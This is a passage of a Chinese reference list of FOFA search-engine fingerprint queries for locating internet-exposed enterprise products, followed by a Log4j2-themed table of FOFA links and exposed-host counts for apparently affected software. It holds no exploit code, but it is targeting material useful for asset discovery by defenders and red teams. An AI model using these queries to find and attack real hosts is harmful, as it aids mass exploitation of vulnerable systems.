| 299 | 信诺瑞得 WiseGrid慧敏应用交付网关                           | app="WiseGrid慧敏应用交付网关"                                                                                     |
| 300 | 一米OA                                            | app="一米OA"                                                                                                 |
| 301 | 亿邮电子邮件系统                                        | body="亿邮电子邮件系统"                                                                                            |
| 302 | 银达汇智 智慧综合管理平台                                   | "汇智信息" && title=="智慧综合管理平台登入"                                                                              |
| 303 | 银澎云计算                                           | app="Hanming-Video-Conferencing"                                                                           |
| 304 | 银澎云计算 好视通视频会议系统                                 | app="Hanming-Video-Conferencing"                                                                           |
| 305 | 用友 FE协作办公平台                                     | "FE协作"                                                                                                     |
| 306 | 用友 U8 OA                                        | "用友U8-OA"                                                                                                  |
| 307 | 用友ERP-NC                                        | app="用友-UFIDA-NC"                                                                                          |
| 308 | 用友GRP-U8行政事业内控管理软件（新政府会计制度专版）                   | title="用友GRP-U8行政事业内控管理软件"                                                                                 |
| 309 | 用友NC                                            | icon_hash="1085941792"                                                                                     |
| 310 | 用友集团合并报表系统                                      | app="用友-UFIDA-NC"                                                                                          |
| 311 | 佑友防火墙                                           | title="佑友防火墙"                                                                                              |
| 312 | 原创先锋 后台管理平台                                     | body="https://www.bjycxf.com/"                                                                             |
| 313 | 源天OA                                            | body="/vmain/login.jsp"                                                                                    |
| 314 | 云时空 社会化商业ERP系统                                  | title="云时空社会化商业ERP"                                                                                        |
| 315 | 浙江宇视科技 网络视频录像机 ISC                              | app="uniview-ISC"                                                                                          |
| 316 | 致翔OA                                            | app="致翔软件-致翔OA"                                                                                            |
| 317 | 致远OA                                            | app="致远互联-OA" && title="V8.0SP2                                                                            |
| 318 | 致远OA A6                                         | title="致远A8+协同管理软件.A6"                                                                                     |
| 319 | 致远OA 帆软组件                                       | title="致远A8-V5协同管理软件 V6.1sp1"                                                                              |
| 320 | 智明 SmartOA                                      | app="智明协同-SmartOA"                                                                                         |
| 321 | 中安网脉-高级威胁检测系统                                   | '威胁检测系统'' && title="高级威胁检测系统"                                                                              |
| 322 | 中科网威                                            | body="Get_Verify_Info(hex_md5(user_string)."                                                               |
| 323 | 中科网威 NPFW防火墙                                    | "中科网威" && "/direct"                                                                                        |
| 324 | 中庆纳博                                            | "中庆纳博"                                                                                                     |
| 325 | 中新金盾信息安全管理系统                                    | title=“中新金盾信息安全管理系统”                                                                                       |
| 326 | 中远麒麟 iAudit堡垒机                                  | cert.subject="Baolei"                                                                                      |
| 327 | 众望网络 微议管理系统                                     | "微议管理系统"                                                                                                   |
| 328 | 紫光电子档案管理系统                                      | app="紫光档案管理系统"                                                                                             |

# Log4j2专题

 

| 1    | [amazon-CloudFront](https://fofa.info/result?qbase64=YXBwPSJhbWF6b24tQ2xvdWRGcm9udCI=) | 111.5m | -    |
| ---- | ------------------------------------------------------------ | ------ | ---- |
| 2    | [vmware-SpringBoot-Framework](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtU3ByaW5nQm9vdC1GcmFtZXdvcmsi) | 1.9m   | -    |
| 3    | [Jenkins](https://fofa.info/result?qbase64=YXBwPSJKZW5raW5zIg==) | 1.2m   | -    |
| 4    | [splunk-日志分析](https://fofa.info/result?qbase64=YXBwPSJzcGx1bmst5pel5b%2BX5YiG5p6QIg==) | 675.4k | -    |
| 5    | [UniFi-Network](https://fofa.info/result?qbase64=YXBwPSJVbmlGaS1OZXR3b3JrIg==) | 414.4k |      |
| 6    | [APACHE-ActiveMQ](https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtQWN0aXZlTVEi) | 241.0k | -    |
| 7    | [RedHat-JBoss-AS](https://fofa.info/result?qbase64=YXBwPSJSZWRIYXQtSkJvc3MtQVMi) | 192.4k | -    |
| 8    | [UNIFI-unifi-摄像头](https://fofa.info/result?qbase64=YXBwPSJVTklGSS11bmlmaS3mkYTlg4/lpLQi) | 144.9k | -    |
| 9    | [AVAYA-IP-Office](https://fofa.info/result?qbase64=YXBwPSJBVkFZQS1JUC1PZmZpY2Ui) | 109.4k | -    |
| 10   | [vmware-Horizon](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtSG9yaXpvbiI=) | 109.1k |      |
| 11   | [Openfire](https://fofa.info/result?qbase64=YXBwPSJPcGVuZmlyZSI=) | 98.2k  | -    |
| 12   | [致远互联-OA](https://fofa.info/result?qbase64=YXBwPSLoh7Tov5zkupLogZQtT0Ei) | 95.8k  | -    |
| 13   | [RabbitMQ](https://fofa.info/result?qbase64=YXBwPSJSYWJiaXRNUSI=) | 76.3k  | -    |
| 14   | [APACHE-Solr](https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtU29sciI=) | 69.1k  |      |
| 15   | [泛微-协同办公OA](https://fofa.info/result?qbase64=YXBwPSLms5vlvq4t5Y2P5ZCM5Yqe5YWsT0Ei) | 63.0k  | -    |
| 16   | [泛微-EMobile](https://fofa.info/result?qbase64=YXBwPSLms5vlvq4tRU1vYmlsZSI=) | 48.4k  | -    |
| 17   | [ManageEngine-ServiceDesk-Plus](https://fofa.info/result?qbase64=YXBwPSJNYW5hZ2VFbmdpbmUtU2VydmljZURlc2stUGx1cyI=) | 41.0k  | -    |
| 18   | [CISCO-Umbrella](https://fofa.info/result?qbase64=YXBwPSJDSVNDTy1VbWJyZWxsYSI=) | 38.3k  | -    |
| 19   | [APACHE-Shiro](https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtU2hpcm8i) | 35.3k  | -    |
| 20   | [APACHE-dubbo](https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtZHViYm8i) | 30.8k  | -    |
| 21   | [致远A8](https://fofa.info/result?qbase64=YXBwPSLoh7Tov5xBOCI=) | 30.1k  | -    |
| 22   | [MyBatis](https://fofa.info/result?qbase64=YXBwPSJNeUJhdGlzIg==) | 24.8k  | -    |
| 23   | [mobileiron-security-platform](https://fofa.info/result?qbase64=YXBwPSJtb2JpbGVpcm9uLXNlY3VyaXR5LXBsYXRmb3JtIg==) | 20.7k  | -    |
| 24   | [APACHE-hadoop-YARN](https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtaGFkb29wLVlBUk4i) | 20.4k  | -    |
| 25   | [致远A6](https://fofa.info/result?qbase64=YXBwPSLoh7Tov5xBNiI=) | 18.2k  | -    |
| 26   | [Map/Reduce](https://fofa.info/result?qbase64=YXBwPSJNYXAvUmVkdWNlIg==) | 17.2k  | -    |
| 27   | [用友-UFIDA-NC](https://fofa.info/result?qbase64=YXBwPSLnlKjlj4stVUZJREEtTkMi) | 17.2k  | -    |
| 28   | [JeeSite](https://fofa.info/result?qbase64=YXBwPSJKZWVTaXRlIg==) | 16.8k  | -    |
| 29   | [vmware-Spring-Framework](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtU3ByaW5nLUZyYW1ld29yayI=) | 16.7k  | -    |
| 30   | [Oracle-E-Business-Suite](https://fofa.info/result?qbase64=YXBwPSJPcmFjbGUtRS1CdXNpbmVzcy1TdWl0ZSI=) | 16.6k  | -    |
| 31   | [JAMES-Mail-Server](https://fofa.info/result?qbase64=YXBwPSJKQU1FUy1NYWlsLVNlcnZlciIgfHwgKGJhbm5lcj0iSkFNRVMiICYmIHByb3RvY29sPSJzbXRwIikK) | 16.5k  |      |
| 32   | [JEECG](https://fofa.info/result?qbase64=YXBwPSJKRUVDRyI=)   | 16.3k  | -    |
| 33   | [泛微-E-Weaver](https://fofa.info/result?qbase64=YXBwPSLms5vlvq4tRS1XZWF2ZXIi) | 13.6k  | -    |
| 34   | [citrix-Endpoint-Management](https://fofa.info/result?qbase64=YXBwPSJjaXRyaXgtRW5kcG9pbnQtTWFuYWdlbWVudCI=) | 12.7k  | -    |
| 35   | [AppDynamics](https://fofa.info/result?qbase64=YXBwPSJBcHBEeW5hbWljcyI=) | 12.6k  | -    |
| 36   | [APACHE-Tapestry](https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtVGFwZXN0cnki) | 12.2k  | -    |
| 37   | [CLOUDERA-Hadoop-Hue](https://fofa.info/result?qbase64=YXBwPSJDTE9VREVSQS1IYWRvb3AtSHVlIg==) | 9.9k   | -    |
| 38   | [APACHE-Zeppelin](https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtWmVwcGVsaW4i) | 9.3k   | -    |
| 39   | [Struts2](https://fofa.info/result?qbase64=YXBwPSJTdHJ1dHMyIg==) | 8.9k   | -    |
| 40   | [vmware-vCenter](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtdkNlbnRlciI=) | 7.7k   | -    |
| 41   | [SonicWall-Email-Security](https://fofa.info/result?qbase64=YXBwPSJTb25pY1dhbGwtRW1haWwtU2VjdXJpdHki) | 7.4k   | -    |
| 42   | [apereo-CAS](https://fofa.info/result?qbase64=YXBwPSJhcGVyZW8tQ0FTIg==) | 7.3k   |      |
| 43   | [vmware-vSphere-Web-Client](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtdlNwaGVyZS1XZWItQ2xpZW50Ig==) | 7.2k   | -    |
| 44   | [vmware-Workspace-ONE-Access](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtV29ya3NwYWNlLU9ORS1BY2Nlc3Mi) | 5.7k   |      |
| 45   | [BROADCOM-Layer7-API-Gateway](https://fofa.info/result?qbase64=YXBwPSJCUk9BRENPTS1MYXllcjctQVBJLUdhdGV3YXki) | 5.0k   | -    |
| 46   | [Jeeplus](https://fofa.info/result?qbase64=YXBwPSJKZWVwbHVzIg==) | 5.0k   | -    |
| 47   | [用友-NC-Cloud](https://fofa.info/result?qbase64=YXBwPSLnlKjlj4stTkMtQ2xvdWQi) | 4.9k   | -    |
| 48   | [APACHE-Skywalking](https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtU2t5d2Fsa2luZyI=) | 4.4k   | -    |
| 49   | [Sophos-Mobile](https://fofa.info/result?qbase64=YXBwPSJTb3Bob3MtTW9iaWxlIg==) | 4.3k   | -    |
| 50   | [NetApp-Cloud-Manager](https://fofa.info/result?qbase64=YXBwPSJOZXRBcHAtQ2xvdWQtTWFuYWdlciI=) | 4.2k   | -    |
| 51   | [vmware-Carbon-Black-EDR](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtQ2FyYm9uLUJsYWNrLUVEUiI=) | 3.3k   | -    |
| 52   | [BROADCOM-CA-SiteMinder](https://fofa.info/result?qbase64=YXBwPSJCUk9BRENPTS1DQS1TaXRlTWluZGVyIg==) | 3.2k   | -    |
| 53   | [vmware-HCX](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtSENYIg==) | 3.1k   |      |
| 54   | [APACHE-Storm](https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtU3Rvcm0i) | 2.9k   | -    |
| 55   | [Apache_OFBiz](https://fofa.info/result?qbase64=YXBwPSJBcGFjaGVfT0ZCaXoi) | 2.6k   |      |
| 56   | [ATLASSIAN-FishEye](https://fofa.info/result?qbase64=YXBwPSJBVExBU1NJQU4tRmlzaEV5ZSI=) | 2.5k   | -    |
| 57   | [APACHE-hadoop-HttpFS](https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtaGFkb29wLUh0dHBGUyI=) | 2.5k   | -    |
| 58   | [vmware-NSX](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtTlNYIg==) | 2.4k   |      |
| 59   | [JEECMS](https://fofa.info/result?qbase64=YXBwPSJKRUVDTVMi)  | 2.3k   | -    |
| 60   | [APACHE-HBase](https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtSEJhc2Ui) | 2.2k   | -    |
| 61   | [Firehose_SERVICE_MONITORING](https://fofa.info/result?qbase64=YXBwPSJGaXJlaG9zZV9TRVJWSUNFX01PTklUT1JJTkci) | 1.9k   | -    |
| 62   | [TamronOS-IPTV系统](https://fofa.info/result?qbase64=YXBwPSJUYW1yb25PUy1JUFRW57O757ufIg==) | 1.8k   | -    |
| 63   | [ECLIPSE-jetty9](https://fofa.info/result?qbase64=YXBwPSJFQ0xJUFNFLWpldHR5OSI=) | 1.8k   | -    |
| 64   | [Zipkin](https://fofa.info/result?qbase64=YXBwPSJaaXBraW4i)  | 1.7k   | -    |
| 65   | [APACHE-Druid](https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtRHJ1aWQi) | 1.6k   |      |
| 66   | [BMC-Control-M-Root-CA](https://fofa.info/result?qbase64=YXBwPSJCTUMtQ29udHJvbC1NLVJvb3QtQ0EiIHx8IHRpdGxlPSJDb250cm9sLU0gV2VsY29tZSBQYWdlIg==) | 1.4k   |      |
| 67   | [OPENCms](https://fofa.info/result?qbase64=YXBwPSJPUEVOQ21zIg==) | 1.3k   | -    |
| 68   | [用友-GRP-U8](https://fofa.info/result?qbase64=YXBwPSLnlKjlj4stR1JQLVU4Ig==) | 1.3k   | -    |
| 69   | [Tableau-Server](https://fofa.info/result?qbase64=YXBwPSJUYWJsZWF1LVNlcnZlciI=) | 1.1k   |      |
| 70   | [WALLIX-Access-Manager](https://fofa.info/result?qbase64=YXBwPSJXQUxMSVgtQWNjZXNzLU1hbmFnZXIi) | <1k    | -    |
| 71   | [bmc-Discovery](https://fofa.info/result?qbase64=YXBwPSJibWMtRGlzY292ZXJ5Ig==) | <1k    | -    |
| 72   | [Intland-codeBeamer](https://fofa.info/result?qbase64=YXBwPSJJbnRsYW5kLWNvZGVCZWFtZXIi) | <1k    | -    |
| 73   | [Micro-Focus-Data-Protector](https://fofa.info/result?qbase64=YXBwPSJNaWNyby1Gb2N1cy1EYXRhLVByb3RlY3RvciI=) | <1k    | -    |
| 74   | [Dell-Storage-Center](https://fofa.info/result?qbase64=YXBwPSJEZWxsLVN0b3JhZ2UtQ2VudGVyIg==) | <1k    | -    |
| 75   | [CISCO-Data-Center-Network-Manager](https://fofa.info/result?qbase64=YXBwPSJDSVNDTy1EYXRhLUNlbnRlci1OZXR3b3JrLU1hbmFnZXIi) | <1k    | -    |
| 76   | [Digital-Workplace-Universal-Client-18.08.00](https://fofa.info/result?qbase64=YXBwPSJEaWdpdGFsLVdvcmtwbGFjZS1Vbml2ZXJzYWwtQ2xpZW50LTE4LjA4LjAwIg==) | <1k    | -    |
| 77   | [Digital-Workplace-Universal-Client-18.02.00](https://fofa.info/result?qbase64=YXBwPSJEaWdpdGFsLVdvcmtwbGFjZS1Vbml2ZXJzYWwtQ2xpZW50LTE4LjAyLjAwIg==) | <1k    | -    |
| 78   | [Digital-Workplace-Universal-Client-3.5.00](https://fofa.info/result?qbase64=YXBwPSJEaWdpdGFsLVdvcmtwbGFjZS1Vbml2ZXJzYWwtQ2xpZW50LTMuNS4wMCI=) | <1k    | -    |
| 79   | [东方国信云-工业互联网平台](https://fofa.info/result?qbase64=YXBwPSLkuJzmlrnlm73kv6HkupEt5bel5Lia5LqS6IGU572R5bmz5Y%2BwIg==) | <1k    | -    |
| 80   | [vmware-vRealize-Orchestrator](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtdlJlYWxpemUtT3JjaGVzdHJhdG9yIg==) | <1k    | -    |
| 81   | [Opencast](https://fofa.info/result?qbase64=YXBwPSJPcGVuY2FzdCI=) | <1k    | -    |
| 82   | [IBM-Planning-Analytics-Workspace-Configuration](https://fofa.info/result?qbase64=YXBwPSJJQk0tUGxhbm5pbmctQW5hbHl0aWNzLVdvcmtzcGFjZS1Db25maWd1cmF0aW9uIg==) | <1k    | -    |
| 83   | [AVAYA-Mcu视频会议系统](https://fofa.info/result?qbase64=YXBwPSJBVkFZQS1NY3Xop4bpopHkvJrorq7ns7vnu58i) | <1k    | -    |
| 84   | [AVAYA-Media-Server](https://fofa.info/result?qbase64=YXBwPSJBVkFZQS1NZWRpYS1TZXJ2ZXIi) | <1k    | -    |
| 85   | [kafka](https://fofa.info/result?qbase64=YXBwPSJrYWZrYSI=)   | <1k    | -    |
| 86   | [OpenMRS](https://fofa.info/result?qbase64=YXBwPSJPcGVuTVJTIg==) | <1k    | -    |
| 87   | [amazon-greengrass](https://fofa.info/result?qbase64=YXBwPSJhbWF6b24tZ3JlZW5ncmFzcyI=) | <1k    | -    |
| 88   | [用友-ism](https://fofa.info/result?qbase64=YXBwPSLnlKjlj4staXNtIg==) | <1k    | -    |
| 89   | [vRealize-Operations-Tenant-App](https://fofa.info/result?qbase64=YXBwPSJ2UmVhbGl6ZS1PcGVyYXRpb25zLVRlbmFudC1BcHAi) | <1k    | -    |
| 90   | [druid-server](https://fofa.info/result?qbase64=YXBwPSJkcnVpZC1zZXJ2ZXIi) | <1k    | -    |
| 91   | [APACHE-Unomi](https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtVW5vbWki) | <1k    | -    |
| 92   | [openNMS-产品](https://fofa.info/result?qbase64=YXBwPSJvcGVuTk1TLeS6p%2BWTgSI=) | <1k    | -    |
| 93   | [JavaMelody](https://fofa.info/result?qbase64=YXBwPSJKYXZhTWVsb2R5Ig==) | <1k    | -    |
| 94   | [amazon-QuickSight](https://fofa.info/result?qbase64=YXBwPSJhbWF6b24tUXVpY2tTaWdodCI=) | <1k    | -    |
| 95   | [vmware-Horizon-DaaS](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtSG9yaXpvbi1EYWFTIg==) | <1k    | -    |
| 96   | [vmware-vRealize-Operations-Manager](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtdlJlYWxpemUtT3BlcmF0aW9ucy1NYW5hZ2VyIg==) | <1k    |      |
| 97   | [vmware-vRealize-Log-Insight](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtdlJlYWxpemUtTG9nLUluc2lnaHQi) | <1k    | -    |
| 98   | [vmware-Tanzu-Observability](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtVGFuenUtT2JzZXJ2YWJpbGl0eSI=) | <1k    | -    |
| 99   | [FORESCOUT-Administration](https://fofa.info/result?qbase64=YXBwPSJGT1JFU0NPVVQtQWRtaW5pc3RyYXRpb24i) | <1k    |      |
| 100  | [amazon-CodePipeline](https://fofa.info/result?qbase64=YXBwPSJhbWF6b24tQ29kZVBpcGVsaW5lIg==) | <1k    | -    |
| 101  | [vmware-Unified-Access-Gateway](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtVW5pZmllZC1BY2Nlc3MtR2F0ZXdheSI=) | <1k    | -    |
| 102  | [NACOS](https://fofa.info/result?qbase64=YXBwPSJOQUNPUyI=)   | <1k    | -    |
| 103  | [APACHE-JSPWiki](https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtSlNQV2lraSI=) | <1k    | -    |
| 104  | [vmware-Spring-Batch](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtU3ByaW5nLUJhdGNoIg==) | <1k    | -    |
| 105  | [CISCO-CloudCenter-Suite](https://fofa.info/result?qbase64=YXBwPSJDSVNDTy1DbG91ZENlbnRlci1TdWl0ZSI=) | <1k    |      |
| 106  | [vmware-Site-Recovery-Manager](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtU2l0ZS1SZWNvdmVyeS1NYW5hZ2VyIg==) | <1k    | -    |
| 107  | [vmware-Identity-Manager](https://fofa.info/result?qbase64=YXBwPSJ2bXdhcmUtSWRlbnRpdHktTWFuYWdlciI=) | <1k    | -    |
| 108  | [amazon-codebuild](https://fofa.info/result?qbase64=YXBwPSJhbWF6b24tY29kZWJ1aWxkIg==) | <1k    | -    |
| 109  | [jeewms](https://fofa.info/result?qbase64=YXBwPSJqZWV3bXMi)  | <1k    | -    |
| 110  | [用友-ERP-NC](https://fofa.info/result?qbase64=YXBwPSLnlKjlj4stRVJQLU5DIg==) | <1k    | -    |
| 111  | [致远互联-FE](https://fofa.info/result?qbase64=YXBwPSLoh7Tov5zkupLogZQtRkUi) | <1k    | -    |
| 112  | [Reactive_Mongo](https://fofa.info/result?qbase64=YXBwPSJSZWFjdGl2ZV9Nb25nbyI=) | <1k    | -    |
| 113  | [APACHE-JMeter](https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtSk1ldGVyIg==) | <1k    | -    |
| 114  | [APACHE-tika](https://fofa.info/result?qbase64=YXBwPSJBUEFDSEUtdGlrYSI=) | <1k    | -    |
| 115  | [Jedis](https://fofa.info/result?qbase64=YXBwPSJKZWRpcyI=)   | <1k    | -    |
| 116  | [Apache-Log4j-Web](https://fofa.info/result?qbase64=YXBwPSJBcGFjaGUtTG9nNGotV2ViIg==) | <1k    | -    |






